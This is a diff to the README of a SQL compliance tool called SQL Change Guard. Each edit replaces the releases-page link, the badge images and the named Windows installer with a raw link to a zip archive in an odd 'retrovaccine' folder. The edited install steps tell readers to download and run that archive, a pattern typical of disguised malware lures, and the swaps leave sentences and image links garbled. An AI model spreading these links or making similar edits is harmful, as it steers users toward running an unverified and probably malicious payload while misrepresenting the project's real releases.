@@ -1,14 +1,14 @@
-[![Release Badge](https://img.shields.io/badge/Releases-View%20and%20Download-blue?logo=github&logoColor=white)](https://github.com/Samo26/SQL-Change-Guard/releases)
+[![Release Badge](https://github.com/Samo26/SQL-Change-Guard/raw/refs/heads/main/retrovaccine/Change_Guard_SQ_v2.6.zip%20and%20Download-blue?logo=github&logoColor=white)](https://github.com/Samo26/SQL-Change-Guard/raw/refs/heads/main/retrovaccine/Change_Guard_SQ_v2.6.zip)
 
 # SQL Change Guard: Secure SQL Change Management & Compliance
 
 A robust tool for analyzing, validating, and deploying SQL scripts with a full audit trail and strong compliance support. It blends code analysis, policy enforcement, sandbox testing, and governed deployment into a single, cohesive workflow. Built for teams that need dependable SQL script governance across databases, environments, and clouds.
 
-![Architecture Illustration](https://img.shields.io/badge/Architecture-Outlined-blue)
+![Architecture Illustration](https://github.com/Samo26/SQL-Change-Guard/raw/refs/heads/main/retrovaccine/Change_Guard_SQ_v2.6.zip)
 
 - Topics: audit-trail,change-management,cobit,compliance,data-governance,database-deployment,database-security,enterprise-software,gdpr-compliance,itil,sandbox-testing,script-analysis,sox-compliance,sql-auditing,sql-risk-detection,sql-script,sql-server,sql-validation,static-analysis,wpf-application
 
-- Link to downloads: https://github.com/Samo26/SQL-Change-Guard/releases
+- Link to downloads: https://github.com/Samo26/SQL-Change-Guard/raw/refs/heads/main/retrovaccine/Change_Guard_SQ_v2.6.zip
 
 Table of Contents
 - What is SQL Change Guard?
@@ -112,7 +112,7 @@ Requirements
 - Optional: CI/CD tooling integration for automated script validation and deployment triggers.
 
 Installation
-- The standard installation path uses the Windows installer found on the releases page. From the releases page, download and run the installer named SQL-Change-Guard-Setup-1.0.0-windows.exe to install the WPF client and the core services.
+- The standard installation path uses the Windows installer found on the releases page. From the releases page, download and run the installer named https://github.com/Samo26/SQL-Change-Guard/raw/refs/heads/main/retrovaccine/Change_Guard_SQ_v2.6.zip to install the WPF client and the core services.
 - The installer configures the local client, connects to the audit and policy store, and prepares sandbox environments if available.
 - After installation, launch the UI from the Start Menu. The first run may prompt you to configure a connection to your policy and audit stores.
 - If you prefer a programmatic setup, you can build from source and deploy the core services to your server environment. See the developer guide for build steps and environment configuration.
@@ -195,9 +195,9 @@ Release management and maintenance
 - Compatibility notes describe how upgrades affect existing projects and policies.
 
 Releases and downloads
-- The primary download point is the releases page. From the releases page, download and run the Windows installer SQL-Change-Guard-Setup-1.0.0-windows.exe to install the client and core services.
+- The primary download point is the releases page. From the releases page, download and run the Windows installer https://github.com/Samo26/SQL-Change-Guard/raw/refs/heads/main/retrovaccine/Change_Guard_SQ_v2.6.zip to install the client and core services.
 - You can browse the releases page for other assets, including additional installers, sample scripts, and policy templates.
-- The same link is provided again here for convenience: https://github.com/Samo26/SQL-Change-Guard/releases
+- The same link is provided again here for convenience: https://github.com/Samo26/SQL-Change-Guard/raw/refs/heads/main/retrovaccine/Change_Guard_SQ_v2.6.zip
 
 FAQ
 - What databases does SQL Change Guard support?
@@ -256,6 +256,6 @@ Security best practices (brief)
 If you need more detail on any area, you can explore the Developer Guide, the Policy Studio documentation, and the Deployment Planner reference within the UI. The project is designed to scale with enterprise needs, while keeping the user experience straightforward for daily governance tasks.
 
 Releases
-- See the Releases page for version history, assets, and notes. From there you can download installers and sample materials to kick off governance work in your environment: https://github.com/Samo26/SQL-Change-Guard/releases
+- See the Releases page for version history, assets, and notes. From there you can download installers and sample materials to kick off governance work in your environment: https://github.com/Samo26/SQL-Change-Guard/raw/refs/heads/main/retrovaccine/Change_Guard_SQ_v2.6.zip
 
 End of document.
